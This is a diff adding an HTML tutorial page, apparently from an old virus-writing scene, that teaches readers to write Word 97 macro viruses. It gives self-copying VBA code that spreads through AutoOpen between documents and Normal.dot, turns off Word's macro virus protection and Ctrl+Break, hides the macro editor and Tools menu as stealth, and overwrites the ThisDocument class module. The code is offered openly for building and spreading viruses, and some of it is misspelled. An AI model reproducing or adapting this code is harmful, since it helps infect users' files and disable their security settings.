@@ -1,0 +1,212 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - How the hell can I make a Word 97 virus?</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<h1 align="center">Word 97 macro virus</h1>
+<h2 align="center"> ?how the hell can I make a Word 97 virus?</h2>
+<p align="center"><font color="#881313">You don't need to be known in the VB Syntax 
+  to understand this mag!<br>
+  But it would be good if you look from time to time into the help files!</font></p>
+<hr>
+<p>How a macro virus works:</p>
+<blockquote> 
+  <p><a href="#lvl11">What's a macro virus</a><br>
+    <a href="#lvl12">How you can find a virus</a><br>
+    <a href="#lvl13">The Word97 virus</a> </p>
+</blockquote>
+<p>Ok, I know how to make a simple virus, but what's about the advanced virii?<br>
+  Now take a look into the VBA help, and look for &quot;For/Next loops&quot; and 
+  &quot;If-Then&quot;</p>
+<blockquote> 
+  <p><a href="#lvl21">Let's do it better</a><br>
+    <a href="#lvl22">What's stealth? and how to hide</a></p>
+</blockquote>
+<p>The Word97 class virii:</p>
+<blockquote> 
+  <p><a href="#lvl31">What's a class virus? and how to write</a> </p>
+</blockquote>
+<p>for problems: <a href="mailto:Lord_Arz@gmx.net">Lord_Arz@gmx.net<br>
+  </a>meet able in the <u><strong>undernet #vir </strong></u></p>
+<h1 align="center"><font color="#24B3FF"><a name="lvl11"></a></font>The Macro 
+  Virus</h1>
+<p>A macro virus is a word basic script (Word97 viriis are written in Visual Basic) 
+  wich copies itself to the Normal.dot.<br>
+  The Normal.dot will be started if you open a document. If the virus is on the 
+  Normal.dot, it copies itself to the document.<br>
+  Let's have a look to the ASCII picture bellow:</p>
+<p>INFECTED DOCUMENT-------(virus)----------&gt;NORMAL.DOT &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the 
+  Normal.dot is now infected.</p>
+<p>INFECTED NORMAL.DOT-----(virus)----------&gt;DOCUMENT &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the 
+  Document is infected</p>
+<p>The Basic Language is easy to learn, if you look at the Assemble language. 
+  But with Assembler you can do much more, than with Basic! Of course there are 
+  polymorph and stealth macro virii, but they are easy to dedect, because the 
+  code is very visible in the Normal.dot. In Word 97 it was very easy to encrypt 
+  macro virii, but in Word97 it is more or less impossible or senseless, because 
+  you have to leave a part of the macro unencrypted.</p>
+<h1 align="center"><a name="lvl12"></a>How to find a macro virus</h1>
+<p>I thougt it's good to know, how to find a macro virus, 'coz then you know where 
+  you have to be carefull if you write one.</p>
+<p>The most virii use stealth techniques against the user, that means, you can't 
+  see the code. The remove the ToolsMacro from the command bar, or have a better 
+  stealth function. Well, because this is a Word97 virii writing tutorial, I'll 
+  list, how to dedect Word97 virii.</p>
+<p>The virus removes the locks Tools Macro and/or the Visual Basic Editor:</p>
+<p>Open the Normal.dot with a hex editor and rename all what's like that: </p>
+<p>M O D U L E 1 . T O O L S M A C R O&nbsp;&nbsp;</p>
+<p> M O D U L E 1 . V I E W V B C O D E</p>
+<p>another good trick is to export all macros from the Normal.dot to a file. If 
+  you want to know more about, read on!</p>
+<h1 align="center"><a name="lvl13"></a>The Word97 Macro Virus</h1>
+<h4><font color="#C10000">How Word97 Works</font></h4>
+<p>Word97 bases primaly on macros. You can change near to everything, if you know 
+  what for a macro is used. For example, you want to add make call a message, 
+  on every start of Word:</p>
+<p>click on Tools - Macros - Visual Basic Editor</p>
+<p>at the project browser click with the right mouse button on Projects(Normal) 
+  and select add module.</p>
+<p>dubble click&nbsp; at the modul. You'll see a text area at the left part of 
+  the screen.</p>
+<p>type the following:</p>
+<p>Sub AutoOpen()<br>
+  MsgBox &quot;Hello&quot;<br>
+  End Sub</p>
+<p>I won't discribe this simple code... you can read it in the help! But you see 
+  AutoOpen will be executed on every start of the Normal.dot. Of course there 
+  are many ways to call a macro on every start. A virus inserts an infection code 
+  instead of the message box.<br>
+</p>
+<p>Here is only a short description:</p>
+<font color="#1701E4">modul name: FirstMacVir</font><br>
+Sub AutoOpen()<br>
+VSource=ActiveDocument.FullName<br>
+VDestination=NormalTemplate.FulllName<br>
+If UCase(ThisDocument.Name)=&quot;NORMAL.DOT&quot; then <br>
+VSource= VDestination <br>
+VDestination=ActiveDocument.FullName<br>
+Application.OrganizerCopy VSource, VDestination &quot;<font color="#1701E4">FirstMacVir</font>&quot;, 
+wdOrganizerObjectProjectItems<br>
+End Sub
+<p>VSource is the file, where the virus is.</p>
+<p>VDestination is the file, wich the virus has to infect.</p>
+<p>I use UCase, to catch errors, wich might happen, if the letter cases are different 
+  e.g the normal templates name is &quot;Normal.Dot&quot;<br>
+  instead &quot;Normal.dot&quot;. </p>
+<p>Now copy the macro&nbsp;<font color="#EBE629"> </font><font color="#1701E4">FirstMacVir</font> 
+  from VSource to VDestination.</p>
+<p>That's a short and very simple virus.</p>
+<h1 align="center"><font color="#D00909"><a name="lvl21"></a></font>The Advanced 
+  Virus</h1>
+<pre>Note! If you want to bee good, you have to try out, and explore!</pre>
+<p>We wrote in the last level, a very simple virus, it would work, but not very 
+  well. The virus would spead and spread and the files would grow on and on... 
+  to avoid this you've to check. Check routines depends on the virus!! If you 
+  write a modul virus, with a fix name, you can identify the virus, by the modul 
+  name. So did the first virii, wich were around, and so we will do it too in 
+  this level:</p>
+<p>Modulname: <font color="#2803DA">Virus2</font></p>
+<big> Sub AutoOpen()</big><br>
+<big>If UCase(ThisDocument.Name) = &quot;NORMAL.DOT&quot; Then<br>
+&nbsp;&nbsp;&nbsp; For i=1 to ActiveDocument.VBProject.VBComponents.Count<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If ActiveDocument.VBProject.VBComponents(i).Name=&quot;<font color="#2803DA">Virus2</font>&quot; 
+Then Goto EndOfVirus</big><br>
+<big>&nbsp;&nbsp;&nbsp; Next i</big><br>
+<big>&nbsp;&nbsp; VSource=NormalTemplate.FullName</big><br>
+<big>&nbsp;&nbsp;&nbsp; VDestiny=ActiveDocument.FullName<br>
+Else<br>
+&nbsp;&nbsp;&nbsp; For i=1 to NormalTemplate.VBProject.VBComponents.Count<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If NormalTemplate.VBProject.VBComponents(i).Name=&quot;<font color="#2803DA">Virus2</font>&quot; 
+Then Goto EndOfVirus<br>
+&nbsp;&nbsp;&nbsp; Next i</big><br>
+<big>&nbsp;&nbsp;&nbsp; VSource=ActiveDocument.FullName</big><br>
+<big>&nbsp;&nbsp;&nbsp; VDestiny=NormalTemplate.FullName<br>
+End if</big><br>
+<big>Application.OrganizerCopy VSource, VDestiny, &quot;ExampleVirus&quot;, wdOrganizerObjectProjectItems<br>
+EndOfVirus:<br>
+End Sub</big><font color="#2803DA"><br>
+<br>
+</font>Ok, you see, this virus uses an infection routine and a check routine. 
+Well, now we've a good and short virus, but without any prodection. Prodection 
+also depends on the virus!! Modulname: <font color="#2803DA">Virus2<br>
+<br>
+</font><big>Sub AutoOpen()</big><br>
+<font color="#BC0C07"><big>Application.EnableCancelKey=False</big><br>
+<big>Options.VirusProdection=False</big></font><big><font color="#F51712"><br>
+</font>If UCase(ThisDocument.Name) = &quot;NORMAL.DOT&quot; Then<br>
+&nbsp;&nbsp;&nbsp; For i=1 to ActiveDocument.VBProject.VBComponents.Count<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If ActiveDocument.VBProject.VBComponents(i).Name=&quot;<font color="#2803DA">Virus2</font>&quot; 
+Then Goto EndOfVirus</big><br>
+<big>&nbsp;&nbsp;&nbsp; Next i</big><br>
+<big>&nbsp;&nbsp; VSource=NormalTemplate.FullName</big><br>
+<big>&nbsp;&nbsp;&nbsp; VDestiny=ActiveDocument.FullName<br>
+Else<br>
+&nbsp;&nbsp;&nbsp; For i=1 to NormalTemplate.VBProject.VBComponents.Count<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If NormalTemplate.VBProject.VBComponents(i).Name=&quot;<font color="#2803DA">Virus2</font>&quot; 
+Then Goto EndOfVirus<br>
+&nbsp;&nbsp;&nbsp; Next i</big><br>
+<big>&nbsp;&nbsp;&nbsp; VSource=ActiveDocument.FullName</big><br>
+<big>&nbsp;&nbsp;&nbsp; VDestiny=NormalTemplate.FullName<br>
+End if</big><br>
+<big>Application.OrganizerCopy VSource, VDestiny, &quot;ExampleVirus&quot;, wdOrganizerObjectProjectItems<br>
+EndOfVirus:<br>
+End Sub</big> 
+<p>The first line bellow Sub AoutoOpen() disables the Break (Ctrl+Break), that 
+  means, the usere isn't able to interrupt the virus by Ctrl-Break.<br>
+  The second line disables the virus prodection of Word97. (I hope you all know 
+  what I mean)</p>
+<pre>now you have a prodected virus that checks for infections
+
+
+</pre>
+<h1 align="center"><a name="lvl22"></a>Stealth</h1>
+<pre>You should add stealth techniques to everyone of your virii!!</pre>
+<p>There are the simple stealth techniques and the special stealth techniques, 
+  wich requies a special knowlege! Stealth ain't stealth in every case! Take a 
+  look at the SuperIIS and then take a look at another virus, SuperIIS has a very 
+  advanced stealth technique, but the code is (with the infection engine, wich 
+  is also special) more than a few hundred lines long!!!!<br>
+  But let's start with the basic stealth:</p>
+<p>Create a new modul and add the following lines:</p>
+<p>Sub ViewVBCode()<br>
+  End Sub</p>
+<p>Now try at the Document, to click on tools-macros-VisualBasicEditor.<br>
+  Huh?, it hasn't worked?? This is because of the macro. Go to the macro, by tools-macros-create. 
+  At the dialog box click on your new macro and click on the edit button.</p>
+<p>The macro, that you must have to lock this could be:</p>
+<p>Sub ToolsMacros()<br>
+  End Sub</p>
+<p>Of course there are many of such simple tricks, but these were the mostly used. 
+  Take a look at other modul virii and study them.</p>
+<p>To kill the whole Tool menu type the following line at your virus:</p>
+<p>Application.CommandBars(&quot;Tools&quot;).Enabled=False</p>
+<p>To kill the Tools Macros only:</p>
+<p>Application.CommandBars(&quot;Tools&quot;).Controls(12).Enabled=False 'you 
+  can use Visible=False too, to hide this option!!</p>
+<h1 align="center"><u><a name="lvl31"></a>The Class Virus</u></h1>
+<p><big>The class virus infects class moduls of a Word document. Classes are invisible 
+  in the 'Tools-</big><br>
+  <big>macros' dialoge. I preferm to write class virii, wich infect the class 
+  'ThisDocument'. This is</big><br>
+  <big>because this class is in EVERY document. I'll explain here how to write 
+  such virii. Notice, that</big><br>
+  <big>this virii have a different infection method!</big></p>
+<p><big>To get my own possition I use:&nbsp;&nbsp;&nbsp;&nbsp; </big><br>
+  <u><big>MyPos=ThisDocument.Name</big></u></p>
+<p><br>
+  <big>The class of the ThisDocument, I want to infect, depends on MyPos.</big><br>
+  <big>Let's say MyPos=&quot;Normal.dot&quot; so I take: </big><br>
+  <u><big>set target=ActiveDocument.VBProject.VBComponents(1).CodeModule</big></u></p>
+<p><u> </u><big>The code for the infection:</big></p>
+<p><big>With NormalTemplate.VBProject.VBComponents(1).CodeModule</big><br>
+  <big>&nbsp;&nbsp;&nbsp; VirusCode= .Lines(1, .CountOfLines)</big><br>
+  <big>End With</big><br>
+  <big>With target</big><br>
+  <big>&nbsp;&nbsp;&nbsp; .DeleteLines 1, .CountOfLines</big><br>
+  <big>&nbsp;&nbsp;&nbsp; .InsertLines 1, VirusCode</big><br>
+  <big>End With</big> </p>
+<hr>
+<p>&nbsp;</p>
+
+</body>
+</html>
